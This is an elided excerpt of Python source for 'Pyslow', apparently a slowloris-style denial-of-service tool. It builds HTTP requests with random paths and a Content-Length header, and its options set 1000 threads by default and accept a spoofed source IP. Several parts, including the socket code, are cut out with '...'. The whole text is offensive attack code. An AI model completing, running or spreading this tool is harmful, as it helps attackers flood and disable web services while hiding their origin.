...
class Pyslow:
    ...
    def mypkt(self):
        text = choice(self.method) + ' /' + str(randint(1, 999999999)) + ' HTTP/1.1\r\n' + \
               ...
               'Content-Length: 42\r\n'
        pkt = bytes(text, 'utf-8')  # Substituindo buffer por bytes
        return pkt

    def building_socket(self):  # Rozendo
        try:
...
'''
    ...
    options.add_argument('-T', metavar='<int>', default=1000, help='Set threads number for connection '
                                                                   '(default = 1000)')
    ...
    options.add_argument('-i', metavar='<ip address>', default=False, help='Specify spoofed ip '
                                                                           'unless use fake ip')
